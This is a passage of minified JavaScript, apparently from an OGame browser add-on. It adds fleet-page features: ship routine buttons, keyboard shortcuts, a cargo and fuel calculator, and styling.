"; font-weight: 700px; line-height: 16px; }","#ago_summary_info li .value { font-weight: normal; float: right; }","#ago_summary_ships td { color: "+q.color.textBlue+"; font-size: 10px; padding: 1px 5px; }","#ago_summary_ships td:nth-child(3) { padding-left: 25px; }","#ago_summary_ships td.ago_summary_shipsNone { color: #3C4D58; }","#ago_summary_ships .ago_summary_ships_value { text-align: right; padding: 1px 11px; }"])},getTask:function(a,b){var c,d;for(d=0;d<a.length;d++)if(a[d].name){var e=n.parseIntAbs(a[d].name);
200<e?l.Task[e]=n.d(a[d].value):l.Task[a[d].name]=n.d(a[d].value)}if(b)for(c in d=f.readTaskParameter(b),d)d[c]&&(l.Task[c]=d[c]);l.Task.ships=0;for(c in f.ItemShip)l.Task[c]&&(l.Task.ships+=l.Task[c])},getStatusBar:function(a,b){var c,d,e;b&&(c=b.querySelectorAll("#fleetStatusBar li"),3<=c.length&&(d=c[1].innerHTML,e=P.afterHTML(d,"</span>").split("]")[1]||"",l.textTarget=P.innerText(d),a.planetName=a.type===T?e:"",a.moonName=a.type===Y?e:"",c=P.afterHTML(c[2].innerHTML,"</span>"),d=P.afterHTML(c,
"</span>").trim(),a.playerHonor=d?f.getPlayerHonor(P.attribute(c,"class")):0,a.playerStatus=f.getPlayerStatus(P.attribute(d||c,"class")),a.playerName=P.innerText(d||c)))},updateContinueButton:function(a,b){var c=document.getElementById("ago_fleet_continue_"+a);h.setText("#ago_fleet_continue_"+a+"_coord",b.coords,c);h.setAttribute("#ago_fleet_continue_"+a+"_type img","src",w.urlTypeIcon(b.type,!0),c);h.setAttribute("#ago_fleet_continue_"+a+"_mission img","src",w.urlMissionIcon(b.mission),c)},getContinueTask:function(a){return w.TABLE("",
"ago_fleet_continue_task","100%",0,0,'<tr><td id="ago_fleet_continue_'+a+'_coord" style="width: 54px;"></td><td id="ago_fleet_continue_'+a+'_type">'+w.IMG("",14)+'</td><td id="ago_fleet_continue_'+a+'_mission">'+w.IMG("",17)+"</td></tr>")}},k={Run:function(){e.is("F00")&&(k.Init(),k.InitOgame(),k.Show(),k.ShowCalculator())},Ready:function(){var a;e.is("F00")&&(J.check(l.Task.routine,2,15,16,17)&&(J.log("Fleet1.Ready "+l.Task.routine),16===l.Task.routine&&(l.Task[V]?(a=l.Task[V]-k.Maxi[V],0<a&&(l.Task[V]=
k.Maxi[V],l.Task[Q]=Math.ceil(a/5))):(a=l.Task[Q]-k.Maxi[Q],0<a&&(l.Task[Q]=k.Maxi[Q],l.Task[V]=5*a))),k.setTask(l.Task),l.Task.type===Y&&(k.Calc.type=Y),k.Calc_setTarget(l.Next.galaxy,l.Next.system,l.Next.position)),e.is("F01")&&f.CoordsActive()&&!l.Task.routine&&k.Autocopy(f.CoordsGet()),k.updateDisplayCounter||k.updateDisplay(),e.is("F02")&&h.addEventAll("#buttonz .buildingimg a.tooltip","click",function(){this.focus()}));K.toggleLargeHeader()},Complete:function(){K.preloadMissionIcon();K.disableAutocomplete()},
Tooltip:function(a,b,c,d){return w.hasClass(c,"tooltip")&&-1<(g(a).attr("onclick")||"").indexOf("toggleMaxShips")?J.check(e.get("F02"),1,3)?2:1:d},Keydown:function(a,b,c){if(13===a.keyCode){if(s.validated)s.trySubmit();else if(a=e.get("F03"))a=document.getElementById("ago_fleet_routine_"+a)||document.getElementById("ago_fleet_continue_"+a),0<(a?a.getAttribute("status"):0)&&h.click(a);return!1}if(12!==c){if(65===a.keyCode)return h.click("#sendall"),!1;if(77===a.keyCode)return h.click("span.send_most a"),
!1;if(81===a.keyCode)return h.click("span.send_none a"),!1;if(69===a.keyCode)return h.click("#ago_fleet_routine_11"),!1;if(84===a.keyCode)return h.click("#ago_fleet_routine_12"),!1;if(83===a.keyCode)return h.click("#ago_fleet_routine_13"),!1}if(11===c&&(38===a.keyCode||40===a.keyCode&&f.ItemShip[n.parseIntAbs(a.target.id)+""]))if(!la||e.is("A25"))return b=3===b?1E3:2===b?100:1===b?10:1,c=h.getValueInteger("#"+a.target.id),c=38===a.keyCode?c+b:c-b,h.setValue("#"+a.target.id,Math.max(c,0)),h.trigger("#"+
a.target.id,"keyup"),a.preventDefault(),!1;return!0},Autocopy:function(a){a&&(a=a.split(",")[0].split(":"),a={galaxy:n.d(a[0]),system:n.d(a[1]),position:n.d(a[2])},k.setTask(a),k.Calc_setTarget(l.Next.galaxy,l.Next.system,l.Next.position))},Init:function(){var a;k.Maxi=k.countShips();f.updateResources(k.Maxi);f.updateUnits(k.Maxi,1,0,!0);var b=document.location.search;-1===b.indexOf("mission=")&&((b=m.getStorage("Fleet_Task"))?m.deleteStorage("Fleet_Task"):b=m.getStorage("Fleet1_Task"));l.Task={};
l.getTask(document.querySelectorAll('#buttonz .content > form input[type="hidden"]'),b);f.updateCoords(l.Task,l.Task,2);l.Task.type=f.checkType(k.Maxi,l.Task.type);l.Task.mission=f.checkMission(k.Maxi,l.Task,l.Task.mission,0);if(!l.Task.routine&&(l.Task.mission||l.Task.ships))l.Task.routine=2;l.Next={};for(a in l.Task)l.Next[a]=l.Task[a];l.Next.routine=0;k.Minimum=f.splitCurrentTask(e.get("F31"),ba,ta,ha);k.Calc=f.splitCurrentTask(e.get("F61"),ma,2,ha);k.Calc.mission=J.check(k.Calc.mission,3,4)?k.Calc.mission:
3;k.Calc.status=9===l.Task.routine||e.is("F62")?1:0;9===l.Task.routine?f.updateResources(k.Calc,l.Task):f.updateResources(k.Calc);k.Trans=f.splitCurrentTask(e.get("F81"),1,2,ha);k.Trans.mission=J.check(k.Trans.mission,3,4)?k.Trans.mission:3;k.Trans.type=f.checkType(k.Maxi,k.Trans.type);k.Trans.preferCargo=k.Trans.preferCargo===V?V:Q;k.Trans.secondCargo=k.Trans.preferCargo===Q?V:Q;k.Trans.need_small_cargo=Math.ceil(k.Maxi.resources/5E3);k.Trans.need_large_cargo=Math.ceil(k.Maxi.resources/25E3);k.Trans.need_first_cargo=
Math.ceil(k.Maxi.resources/f.Item[k.Trans.preferCargo].capacity);k.Trans.status=k.Trans.need_first_cargo<=k.Maxi[k.Trans.preferCargo]?2:k.Trans.need_small_cargo<=k.Maxi[V]+5*k.Maxi[Q]?1:0;k.Trans[k.Trans.preferCargo]=Math.min(k.Trans.need_first_cargo,k.Maxi[k.Trans.preferCargo]);k.Trans[k.Trans.secondCargo]=k.Maxi[k.Trans.preferCargo]<k.Trans.need_first_cargo?Math.ceil((k.Trans.need_first_cargo-k.Maxi[k.Trans.preferCargo])*f.Item[k.Trans.preferCargo].capacity/f.Item[k.Trans.secondCargo].capacity):
0;k.Expo=f.splitCurrentTask(e.get("F71"),ma,3,ha);k.Expo.position=16;k.Expo.type=1;k.Expo.mission=15;k.Expo.status=0;if(n.isMinMax(k.Expo.rangeCoords,1,100)){var b=m.getStorageObject("Fleet_Expedition"),c=f.PlanetsActive.galaxy+":"+f.PlanetsActive.system,d=n.d(b[c]);if(d>k.Expo.system+k.Expo.rangeCoords||d>e.get("S23")||d<k.Expo.system-k.Expo.rangeCoords||1>d)b[c]=n.minMax(k.Expo.system-k.Expo.rangeCoords,1,e.get("S23")),m.setStorageObject("Fleet_Expedition",b);k.Expo.system=b[c]}k.Expo[xa]=e.get("F73")?
1:0;b=f.chooseTopscore(2500,6E3,9E3,12E3);if(f.ItemShip[k.Expo.preferShip]){if(k.Maxi[k.Expo.preferShip])k.Expo.status=2;else{c="204 205 206 207 215 211 213".split(" ");n.d(k.Expo.preferShip)>=n.d("207")&&c.reverse();for(a=0;a<c.length;a++)if(k.Maxi[c[a]]){k.Expo.status=1;k.Expo.preferShip=c[a];break}}k.Expo.status&&f.Item[k.Expo.preferShip]&&(k.Expo[k.Expo.preferShip]=1,b-=(f.Item[k.Expo.preferShip].metal+f.Item[k.Expo.preferShip].crystal)/200)}k.Expo.preferCargo=k.Expo.preferCargo===V?V:Q;k.Expo.secondCargo=
k.Expo.preferCargo===Q?V:Q;c=Math.ceil(b/((f.Item[k.Expo.preferCargo].metal+f.Item[k.Expo.preferCargo].crystal)/200));k.Expo[k.Expo.preferCargo]=Math.min(c,k.Maxi[k.Expo.preferCargo]);k.Expo[k.Expo.preferCargo]===c?k.Expo.status=2===k.Expo.status||!k.Expo.preferShip?2:1:(k.Maxi[k.Expo.preferCargo]&&(b-=k.Maxi[k.Expo.preferCargo]*((f.Item[k.Expo.preferCargo].metal+f.Item[k.Expo.preferCargo].crystal)/200)),c=Math.ceil(b/((f.Item[k.Expo.secondCargo].metal+f.Item[k.Expo.secondCargo].crystal)/200)),k.Expo[k.Expo.secondCargo]=
Math.min(c,k.Maxi[k.Expo.secondCargo]),k.Expo.status=k.Expo[k.Expo.secondCargo]===c?1:0);k.Save=f.splitCurrentTask(e.get("F91"),ba,3,ha);k.Save.type=f.checkType(k.Maxi,k.Save.type);k.Save.mission=f.checkMission(k.Maxi,k.Save,k.Save.mission,0)||f.checkMission(k.Maxi,k.Save,e.get("F95"),0)||f.checkMission(k.Maxi,k.Save,e.get("F96"),0)||f.checkMission(k.Maxi,k.Save,e.get("F97"),0)||3;k.Save.status=k.Maxi.capacity>k.Maxi.resources?2:1;for(a in f.ItemShip)k.Save[a]=k.Maxi[a]?k.Save[a]?Math.max(k.Maxi[a]-
k.Save[a],0):k.Maxi[a]:0;b=f.getTaskQueue("Fleet_LastTask",0)[0];k.Last=f.splitTask(b,ba,1);k.Last.status=0;if(k.Last.coords){b=!0;for(a in f.ItemShip)k.Last[a]&&(k.Maxi[a]&&(k.Last.status=2),k.Last[a]>k.Maxi[a]&&(b=!1));k.Last.status=k.Last.status?b?3:2:1}},InitOgame:function(){var a=s.checkShips;s.checkShips=function(b){a(b);k.updateDisplay()};var b=s.clearInput;s.clearInput=function(a){b(a);k.updateDisplay()};var c=s.trySubmit;s.trySubmit=function(){s.validated&&document.activeElement.blur();c();
k.nextTask()};e.is("A21")&&(s.submitOnEnter=function(){return!0})},Show:function(){function a(a,b,c,d){return"<tr><td><big>&#9642; </big>"+e.label(a)+(b?" ("+r.formatNumber(b)+")":"")+'</td><td id="'+c+'">'+d+"</td></tr>"}function b(a,b){return'<a id="ago_fleet_routine_'+a+'" class="ago_fleet_routine_button ago_next_button tooltip" href="javascript:void(0);" title="'+e.label(b)+'"></a>'}function c(a,b,c){return'<tr><td><a id="ago_fleet_continue_'+a+'" class="ago_fleet_continue_button ago_next_button tooltip" href="javascript:void(0);" title="'+
e.label(c)+'"><span>'+e.label(b)+l.getContinueTask(a)+"</span></a></td></tr>"}var d;d="";var j=k.Trans.status?"text_orange":"text_palered",t=k.Trans.need_small_cargo>k.Maxi[V]?j:"text_limegreen",j=k.Trans.need_large_cargo>k.Maxi[Q]?j:"text_limegreen";e.is("F50")&&(d=a("F54","","",r.formatNumber(k.Maxi.resources))+a("F53","","ago_fleet_info_capacity",0)+a("L202",k.Maxi[V],"",'<a href="javascript:void(0);" class="ago_fleet_cargo '+t+'" rel="am202='+k.Trans.need_small_cargo+'">'+r.formatNumber(k.Trans.need_small_cargo)+
"</a>")+a("L203",k.Maxi[Q],"",'<a href="javascript:void(0);" class="ago_fleet_cargo '+j+'" rel="am203='+k.Trans.need_large_cargo+'">'+r.formatNumber(k.Trans.need_large_cargo)+"</a>")+a("F56",f.chooseTopscore(2500,6E3,9E3,12E3),"ago_fleet_info_expoints",0)+a("F55","","ago_fleet_info_speed",0));if(t=document.getElementById("allornone")){g(".send_all",t).after('<span class="send_most"><a id="sendmost" title="'+e.label("F37")+'" class="tooltip js_hideTipOnMobile" href="javascript:void(0);"></a></span>');
h.addEvent("#sendmost","click",k.setMostShips,!1,t);g("#continue span",t).css("line-height","18px").append(l.getContinueTask(1));g("a#continue").addClass("test");g("a#continue",t).after(b(13,"F9T",k.Save.mission)+b(12,"F8T",11)+b(11,"F7T",k.Expo.mission));e.is("A24")&&g("a#continue",t).bind("dblclick",function(){h.click("#sendall");h.click("#fleet1 #continue")});var j='<tr><td>&nbsp;</td></tr><tr><td><textarea id="ago_fleet_read" style="width: 106px; height: 60px; min-height: 60px; border-radius: 3px;"></textarea></td></tr><tr><td style="text-align: center;" class="tooltip js_hideTipOnMobile" title="'+
e.label("FPT")+'">'+e.label("FP1")+"</td></tr>",m="<tr><td>&nbsp;</td></tr>"+c(5,"FLB","FLT")+"<tr><td>&nbsp;</td></tr>"+c(9,"F6B","F6T");d='<tr><td><div class="ago_fleet_read">'+w.TABLE("","","100%",0,0,j)+'</div></td><td><div class="ago_fleet_infos">'+w.TABLE("","","100%",0,0,d)+'</div></td><td><div class="ago_fleet_routine">'+w.TABLE("","","100%",0,0,"<tr><td>&nbsp;</td></tr>")+'</div></td><td><div class="ago_fleet_continue">'+w.TABLE("","","100%",0,0,m)+"</div></td></tr>";g(".allornonewrap",t).append(w.TABLE("",
"","100%",0,0,d));h.addEventAll(".ago_fleet_routine_button, .ago_fleet_continue_button","click",k.clickRoutine,!1,t);e.is("A24")&&h.addEventAll(".ago_fleet_routine_button, .ago_fleet_continue_button","dblclick",k.clickRoutine,!1,t);e.is("F50")&&g(".ago_fleet_cargo",t).bind("click",function(){k.setTask(this.rel)});g("#ago_fleet_read",t).bind("click keyup blur",k.readText).bind("dblclick",function(){this.value=""});l.updateContinueButton(5,k.Last)}else e.is("F50")&&(d='<tr><td style="width: 122px;"></td><td><div class="ago_fleet_infos" style="width: 256px;">'+
w.TABLE("","","100%",0,0,d)+"</div></td></tr>",g("#warning").append(w.TABLE("","","100%",0,0,d)).find("div.ago_fleet_infos").find("tr:nth-child(2), tr:nth-child(5), tr:nth-child(6)").hide())},styles:function(){e.is("F00")&&(L.styles(),q.setCache(["#fleet1 .allornonewrap .secondcol { width: 106px; padding: 5px; }",'.send_most a { background: url("'+q.image.ShipsMost+'") no-repeat scroll left top transparent; display: block; float: left; height: 32px; width: 32px; margin-left: 5px; }',".send_most a:hover { background-position: 0 -32px; }",
"#fleet1 .allornonewrap .firstcol { width: 210px; padding-left: 30px; }","#fleet1 #buttonz { height: auto; }","#fleet1 #allornone .info { display: none; }",".ago_fleet_read { width: 152px; }",".ago_fleet_infos { width: 260px; }",".ago_fleet_infos td { height: 15px; white-space: nowrap; font-size: 11px; line-height: 15px; font-weight: 500; color: "+q.color.textBlue+"; }",".ago_fleet_infos td:last-child { text-align: right; }",".ago_fleet_routine { width: 94px; }",".ago_fleet_routine_button { background: url(/cdn/img/layout/mission_icons.jpg) no-repeat scroll -38px -76px transparent; background-size: 418px 152px; display: block; height: 38px; width: 38px; float: right; margin-right: 5px; }",
"#fleet1 a#continue { margin: 0 ! important; }",".ago_fleet_continue { width: 101px; }",'.ago_fleet_continue_button { display: inline-block; height: 38px; width: 104px; background: url("/cdn/img/layout/detail-spriteset.png") repeat scroll -206px -278px transparent; }',".ago_fleet_continue_button.on{ background-position: 0 -240px; }",".ago_fleet_continue_button:active:not(.on) { background-position: -206px -240px; }",".ago_fleet_continue_button span { display: block; height: 38px; overflow: hidden; text-align: center; text-transform: uppercase; font-size: 12px; line-height: 18px; font-weight: 700; color: "+
q.color.textWhite+"; }",".ago_fleet_continue_button:hover { text-decoration: none !important; }",".ago_fleet_continue_task td { font-size: 10px; padding: 0 2px 0 0; text-align: center; width: 20px; }","#calculator { margin: 3px 0; padding: 1px 0; background-color: #13181D; border: 3px double black; width: 633px; }","#calculator table { width:620px; margin: 0 auto; }","#calculator td, #calculator th, #calculator input { text-align:right;}","#calculator select, #calculator option { text-align:center;}",
"#calculator #calc_res input, #calculator #calculator #calc_coords { width:100px; }","#calculator #calc_sl { font-size:11px;}","#calculator option { padding-right:3px;}","#fleet1 #buttonz #calculator a { text-decoration:underline !important; color:#5577EE; }","#calculator td, #calculator th { border:1px solid grey; padding: 1px 3px;}","#calculator #calc_galaxy {width:14px;}","#calculator #calc_system {width:27px;}","#calculator #calc_position {width:16px;}",'#fleet1 #buttonz #calculator input[type="text"] { position: static; width: 120px; }']))},
clickRoutine:function(a){if(this&&this.id){var b=n.parseIntAbs(this.id),c=n.d(this.getAttribute("status"));if(9===b&&2>c)1===c?g("#calculator").hide():g("#calculator").show(),k.updateDisplay();else if(!c&&("dblclick"===a.type&&J.check(b,11,12,13))&&(c=1),0<b&&c){K.addFeedback(this);switch(b){case 11:k.setTask(k.Expo,1,b);break;case 12:k.setTask(k.Trans,1,b);break;case 13:k.setTask(k.Save,1,b);break;case 5:k.setTask(k.Last,1,b);break;case 9:k.setTask(k.Calc,1,b)}s.trySubmit()}}},readText:function(a){if(a&&
a.target&&a.target.value&&(a=f.parseCoords(a.target.value))&&a.length)if(a=f.storeCoords(a))B.updateIcon(),k.Autocopy(a)},countShips:function(){for(var a={capacity:0,ships:0},b=document.querySelectorAll("#buttonz form li"),c=0;c<b.length;c++){var d="",j=n.parseIntAbs(b[c].id)+"";j&&f.Item[j]&&(a[j]=n.parseIntAbs(P.afterHTML(g("span.level",b[c]).html(),"</span>")),a.ships+=a[j],a.capacity+=a[j]*f.Item[j].capacity,J.check(e.get("F02"),1,3)&&(d='<span class="ago_items_textName ago_items_text ago_text_background">'+
e.label("L"+j)+"</span>"),J.check(e.get("F02"),2,3)&&(d+='<span class="ago_items_textInfo ago_items_text ago_text_background">'+r.formatNumber(f.getShipSpeed(j))+'</span><span class="ago_items_textCount ago_items_text ago_text_background" id="anti_ship_'+j+'"></span>'),d&&g("div > a",b[c]).append(d))}return a},nextTask:function(){var a=document.getElementById("continue");a&&s.validated&&(l.Next.routine||K.addFeedback(a),!l.Next.routine&&J.check(l.Task.routine,2,15,16,17)&&(l.Next.routine=l.Task.routine),
a=J.check(l.Next.routine,9,12,13)?1:ma,m.setStorage("Fleet2_Task",f.joinTaskFleet(l.Next,a)));l.Next.routine=0},setMostShips:function(){var a={},b;for(b in f.ItemShip)a[b]=k.Maxi[b]?k.Minimum[b]?Math.max(k.Maxi[b]-k.Minimum[b],0):k.Maxi[b]:0;k.setTask(a,2)},setTaskCalculator:function(a){a&&(a="string"===typeof a?f.splitTask(a,1,1):a,a.routine=9,k.setTask(a),k.Calc.type=a.type===Y?Y:T,k.Calc_setTarget(a.galaxy,a.system,a.position),k.Calc_setResources(a.metal,a.crystal,a.deuterium),g("#calculator").show(),
k.Calculator_calculate(),k.updateDisplay())},setTask:function(a,b,c){var d;if((d=document.getElementById("inhalt"))&&k.status){"string"===typeof a&&(a=f.readTaskParameter(a));l.Next.routine=c||0;f.updateCoords(l.Next,a,ta);h.setValue('input[name="galaxy"]',l.Next.galaxy,d);h.setValue('input[name="system"]',l.Next.system,d);h.setValue('input[name="position"]',l.Next.position,d);f.updateResources(l.Next,a);k.lockUpdateDisplay=!0;if(b){if(2===b||!l.Next.ships)s.setMaxIntInput("form[name=shipsChosen]",
a),s.checkShips("shipsChosen")}else for(var e in f.ItemShip)0<a[e]&&g("#ship_"+e,d).attr("value",a[e]).trigger("keyup"),l.Next[e]=n.d(a[e]);k.lockUpdateDisplay=!1;a.type&&(l.Next.type=a.type);a.mission&&(l.Next.mission=a.mission);n.isMinMax(a.speed,1,10)&&(l.Next.speed=a.speed,h.setValue('input[name="speed"]',l.Next.speed,d));b=["holdingtime","expeditiontime","union","retreatAfterDefenderRetreat","preferResource"];for(c=0;c<b.length;c++)l.Next[b[c]]=n.d(a[b[c]]);k.updateDisplay()}},updateDisplay:function(){var a,
b;if((a=document.getElementById("inhalt"))&&6<=k.status&&!k.lockUpdateDisplay){k.updateDisplayCounter=1;l.Next.capacity=0;l.Next.expoints=0;l.Next.ships=0;l.Next.minspeed=0;for(var c=a.querySelectorAll(".fleetValues"),d=0;d<c.length;d++){var j=n.d(c[d].value),t=n.parseIntAbs(c[d].id)+"";if(f.Item[t]){if(J.check(e.get("F02"),2,3)){var m=k.Maxi[t]-l.Next[t],p=k.Maxi[t]-j;if(0>m||p!==k.Maxi[t]){var E=c[d].parentNode.querySelector("#anti_ship_"+t);E&&(p=0>m?m:p,E.textContent=p?r.formatNumber(p):"",E.style.color=
0>m?"#E41615":q.color.textLightGreen)}}l.Next[t]=j;0<j&&(l.Next.ships+=j,l.Next.capacity+=j*f.Item[t].capacity,l.Next.expoints+=j*((f.Item[t].metal+f.Item[t].crystal)/200),l.Next.minspeed=Math.min(l.Next.minspeed,f.getShipSpeed(t))||f.getShipSpeed(t))}}c={};for(b in l.Next)c[b]=l.Next[b];c.type=f.checkType(c,l.Next.type||l.Task.type);c.mission=f.checkMission(c,c,l.Next.mission||l.Task.mission,2);l.Next.routine?(f.selectMission(c,2),f.selectType(c,4)):(f.selectMission(c,2,!0),f.selectType(c,2));h.setValue('input[name="mission"]',
c.mission,a);h.setValue('input[name="type"]',c.type,a);g("#ago_fleet_info_capacity",a).html(r.formatNumber(l.Next.capacity)).attr("class",l.Next.capacity>=k.Maxi.resources?"text_green":"text_palered");g("#ago_fleet_info_expoints",a).html(r.formatNumber(l.Next.expoints)).attr("class",l.Next.expoints>=f.chooseTopscore(2500,6E3,9E3,12E3)?"text_green":"text_palered");g("#ago_fleet_info_speed",a).html(r.formatNumber(l.Next.minspeed));l.updateContinueButton(1,c);l.Next.routine||(b=2===k.Expo.status&&!l.Next.ships?
2:1===k.Expo.status||l.Next.ships?1:0,k.updateRoutineButton(11,15,b,a),b=k.Trans.owncoords?2===k.Trans.status&&!l.Next.ships?2:1===k.Trans.status||l.Next.ships?1:0:0,k.updateRoutineButton(12,11,b,a),b=2===k.Save.status&&!l.Next.ships?2:1===k.Save.status||l.Next.ships?1:0,k.updateRoutineButton(13,k.Save.mission,b,a),b=3===k.Last.status&&!l.Next.ships?2:2===k.Last.status||k.Last.status&&l.Next.ships?1:0,g("#ago_fleet_continue_5",a).attr("status",b).removeClass("on off").addClass(b?"on":"off"),g("#ago_fleet_continue_5 > span",
a).css("width","100px").css("height","36px").css("border-radius","3px").css("border",2===b?"1px solid #FEF006":"1px solid transparent"),b=g("#calculator:visible",a).length?l.Next.ships?2:1:0,g("#ago_fleet_continue_9",a).attr("status",b).removeClass("on off").addClass(2===b?"on":"off"),l.updateContinueButton(9,k.Calc),!l.Next.ships&&g("#continue",a).hasClass("on")&&g("#continue",a).removeClass("on").addClass("off"))}},updateRoutineButton:function(a,b,c,d){b=[0,"-305px","-380px","-190px","-114px","-266px",
"-228px","-76px","-152px","-342px",0,"-38px",0,0,0,"0"][b]+[" -76px"," 0"," -38px"][c];g("#ago_fleet_routine_"+a,d).attr("status",c).css("background-position",b)},ShowCalculator:function(){function a(a){return'<td colspan="3"><a href="javascript:void(0);" ref="'+a+'">0</a></td>'}function b(a){return'<th colspan="4"><a href="javascript:void(0);" id="calc_hdr_'+a+'">'+e.label("metal"===a?"L091":"crystal"===a?"L092":"deuterium"===a?"L093":"")+"</a></th>"}function c(a){return'<td colspan="4"><input type="text" id="calc_'+
a+'" value="'+k.Calc[a]+'"></td>'}function d(a){return'<td colspan="3" ref="'+a+'"></td>'}function j(a){return'<td colspan="3" ref="'+a+'"></td>'}try{var f='<div id="calc_coords"><input id="calc_galaxy" value="'+k.Calc.galaxy+'"> : <input id="calc_system" value="'+k.Calc.system+'"> : <input id="calc_position" value="'+k.Calc.position+'"></div>',l='<td><a id="calc_clear" href="javascript:void(0);">'+e.label("F69")+"</a></td>",m=document.createElement("div");m.id="calculator";m.style.display=k.Calc.status?
"block":"none";m.innerHTML='<table><tr id="calc_res_hdr"><th></th>'+b("metal")+b("crystal")+b("deuterium")+"<th>"+e.label("M23")+'</th></tr><tr id="calc_res"><td></td>'+c("metal")+c("crystal")+c("deuterium")+'<td id="calc_total">0</td></tr><tr><th></th><th colspan="3">'+e.label("K202")+'</th><th colspan="3">'+e.label("K203")+'</th><th colspan="3">'+e.label("K209")+'</th><th colspan="3">'+e.label("K214")+"</th><th>"+f+'</th></tr><tr id="calc_ships"><th>'+e.label("F64")+"</th>"+a(V)+a(Q)+a("209")+a("214")+
'</tr><tr id="calc_cons"><th>'+e.label("F67")+"</th>"+d(V)+d(Q)+d("209")+d("214")+'<td></td></tr><tr id="calc_dur"><th>'+e.label("F65")+"</th>"+j(V)+j(Q)+j("209")+j("214")+l+"</tr></table>";g("#allornone").append(m);g("#calc_coords input").bind("keyup",function(){k.Calc_checkCoord(this);k.Calculator_calculate()}).bind("focus",function(){g(this).attr("last",this.value).attr("value","");k.Calculator_calculate()}).bind("blur",function(){this.value||(this.value=g(this).attr("last"));k.Calculator_getTarget()});
g("#calc_res input").bind("keyup",function(){k.Calc_checkResource(this);k.Calculator_calculate()}).bind("focus",function(){this.value="";k.Calculator_calculate()}).bind("blur",function(){this.value||(this.value="0");k.Calculator_getResources()});g("#calc_ships a").bind("click",function(){var a={};a[n.d(this.getAttribute("ref"))]=n.parseIntAbs(this.innerHTML);k.setTask(a)});g("#calc_res_hdr a").bind("click",function(){var a=this.id.replace(/calc_hdr_/,""),b=n.parseIntFormat(h.getTextById("resources_"+
a));document.getElementById("calc_"+a).value=b;k.Calculator_calculate()});g("#calc_clear").bind("click",k.Calculator_clear);g("#calc_sl").bind("change",function(){if(this.value){var a=this.value.split("#");k.Calc_setTarget(a[0],a[1],a[2]);k.Calculator_calculate()}});k.Calculator_calculate()}catch(p){}},Calculator_getResources:function(){k.Calc.metal=h.getValueByIdInteger("calc_metal");k.Calc.crystal=h.getValueByIdInteger("calc_crystal");k.Calc.deuterium=h.getValueByIdInteger("calc_deuterium")},Calc_setResources:function(a,
b,c){h.setValueByIdInteger("calc_metal",a);h.setValueByIdInteger("calc_crystal",b);h.setValueByIdInteger("calc_deuterium",c);k.Calculator_getResources()},Calc_checkResource:function(a){a&&a.value&&(a.value=r.d(n.parseIntFormat(a.value)))},Calculator_getTarget:function(){f.updateCoords(k.Calc,"",2,h.getValueByIdInteger("calc_galaxy"),h.getValueByIdInteger("calc_system"),h.getValueByIdInteger("calc_position"));l.updateContinueButton(9,k.Calc)},Calc_setTarget:function(a,b,c){h.setValueByIdInteger("calc_galaxy",
a);h.setValueByIdInteger("calc_system",b);h.setValueByIdInteger("calc_position",c);k.Calculator_getTarget()},Calc_checkCoord:function(a){a&&(a.value&&a.id)&&(a.value=r.d(f.getCoordPart(n.d(a.value),a.id.split("_")[1])))},Calculator_calculate:function(){k.Calculator_getResources();k.Calculator_getTarget();var a=k.Calc.metal+k.Calc.crystal+k.Calc.deuterium,b=f.getFleetDistance(f.PlanetsActive,k.Calc);g("#calc_total").html(r.formatNumber(a));for(var c=[V,Q,"209","214"],d=0;d<c.length;d++){var e=c[d],
h=f.getFleetDuration(e,b),l=f.getFleetConsumption(e,b),m=Math.max(0,Math.ceil(a/(f.Item[e].capacity-l))),n=m<=k.Maxi[e]?q.color.textLimeGreen:!k.Maxi[e]?q.color.textInactive:q.color.textPaleRed;g('#calc_ships a[ref="'+e+'"]').html(r.formatNumber(m)).css("color",n);g('#calc_dur td[ref="'+e+'"]').html(A.formatTime(h));g('#calc_cons td[ref="'+e+'"]').html(r.formatNumber(l*m))}},Calculator_clear:function(){k.Calc_setResources(0,0,0);k.Calc_setTarget(l.Task.galaxy,l.Task.system,l.Task.position);k.Calculator_calculate()}},
D={isTarget:0,Run:function(){e.is("F00")&&(D.Init(),D.InitOgame(),D.Show(),l.ShowInfo(),D.ShowTarget(e.is("F10")))},Ready:function(){e.is("F00")&&(0<l.Task.union&&D.setTask("0:0:0:0:0:0:0:0:"+l.Task.union),D.updateDisplayCounter||D.updateDisplay(),1<=I.status&&(l.Task.owncoords||D.loadPlayer(l.Task,!0)),h.addEvent("#back","click",D.backTask));K.toggleLargeHeader(e.is("F00")&&e.is("F11"))},Complete:function(){K.preloadMissionIcon();K.disableAutocomplete()},Keydown:function(a){return 13===a.keyCode?
(s.validated&&s.trySubmit(),!1):!0},Autocopy:function(a){a&&(a=a.split(",")[0])&&D.setTask(a)},EventList:function(a){g("#ago_briefing_info").text(a)},Init:function(){var a;if(a=document.querySelector("#contentWrapper > form")){l.Task={speed:h.getValueInteger("#speed",a)||10};l.getTask(a.querySelectorAll("input"),m.getStorage("Fleet2_Task"));l.getStatusBar(l.Task,a);f.updateCoords(l.Task,l.Task,2);2===l.Task.owncoords&&(2!==l.Task.type&&e.isAnd("F20","F2A"))&&(l.Task.type=e.type);l.Task.type=f.checkType(l.Task,
l.Task.type);l.Task.mission=l.Task.routine?f.checkMission(l.Task,l.Task,l.Task.mission,0):0;l.Next={};for(var b in l.Task)l.Next[b]=l.Task[b]}},InitOgame:function(){var a=s.setTType;s.setTType=function(b){try{D.changeType(b)&&a(b)}catch(c){}};var b=s.checkOk;s.checkOk=function(){b();D.updateDisplayOgame(!0)};var c=s.clearInput;s.clearInput=function(a){c(a);s.checkOk()};var d=s.trySubmit;s.trySubmit=function(){s.validated&&document.activeElement.blur();d();D.nextTask()};e.is("A21")&&(s.submitOnEnter=
function(){return!0});s.getFreeStorage=function(){var a=s.storageCapacity-s.consumption;return 0>a?a:a-(s.probeStorageCapacity-s.getConsumption(xa))}},Show:function(){var a,b,c,d,j,f;if(a=document.querySelector("#contentWrapper > form")){h.prepend(a.querySelector("#shortcuts"),h.create("div",{id:"ago_fleet_player","class":"planetname"}));h.append(a.querySelector(".briefing h2"),h.create("span",{id:"ago_briefing_info"}));c=a.querySelectorAll("#slbox option");for(f=0;f<c.length;f++);c=h.create("li",
{id:"ago_fleet_acsduration"},{display:"none"},"",e.label("F58")+':<span class="value"><span id="ago_fleet_acsduration_time"></span> h</span></li>');h.after(a.querySelector("#duration").parentNode,c);if(b=a.querySelector("#speed")){if(e.is("F12")){b.parentNode.style.display="none";h.setStyles(a.querySelector("#consumption").parentNode.parentNode,{position:"absolute",top:"42px"});c=h.create("li",{id:"ago_fleet_speed"});d=c.appendChild(document.createElement("table")).appendChild(document.createElement("tr"));
